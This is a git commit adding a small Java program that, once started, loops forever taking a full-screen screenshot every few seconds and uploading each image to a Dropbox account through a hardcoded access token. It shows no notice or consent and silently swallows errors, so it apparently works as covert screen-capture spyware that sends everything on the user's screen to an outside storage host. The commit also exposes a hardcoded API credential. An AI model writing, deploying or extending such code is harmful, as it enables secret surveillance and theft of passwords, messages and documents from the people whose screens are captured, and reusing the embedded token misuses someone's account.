85c5d32b581ccc25633c3b7b6e82994bc915f7a4
konstantsirin <konstantin.sirin@mail.ru>
2019-06-21 22:14:56 +0500

    init commit

---
+++ src/Main.java
@@ -0,0 +1,8 @@
+public class Main
+{
+    public static void main(String[] args) throws InterruptedException {
+        MyThread thread = new MyThread();
+        thread.start();
+    }
+}
+
---
+++ src/MyThread.java
@@ -0,0 +1,55 @@
+import com.dropbox.core.DbxException;
+import com.dropbox.core.DbxRequestConfig;
+import com.dropbox.core.v2.DbxClientV2;
+import com.dropbox.core.v2.files.UploadErrorException;
+
+import javax.imageio.ImageIO;
+import java.awt.*;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+
+public class MyThread extends Thread
+{
+    @Override
+    public void run()
+    {
+        String ACCESS_TOKEN = "Kq8GMFb34IAAAAAAAAAAFLk_t5bofhDSRX75rYqV2AIQ0TSA1E2RnLV01liMzc8v";
+
+        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
+        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
+
+        for(;;)
+        {
+            BufferedImage image = null;
+            try {
+                image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+
+                SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd_HHmmss");
+                String date = format.format(new Date());
+
+                ByteArrayOutputStream os = new ByteArrayOutputStream();
+
+                ImageIO.write(image, "png", os);
+
+                byte[] bytes = os.toByteArray();
+                InputStream is = new ByteArrayInputStream(bytes);
+
+                client.files().uploadBuilder("/" + date + ".png")
+                        .uploadAndFinish(is);
+
+                sleep(3250);
+
+            } catch (AWTException e) {e.printStackTrace();
+            } catch (InterruptedException e) {e.printStackTrace();
+            } catch (UploadErrorException e) {e.printStackTrace();
+            } catch (DbxException e) {e.printStackTrace();
+            } catch (IOException e) {e.printStackTrace();}
+
+        }
+    }
+}
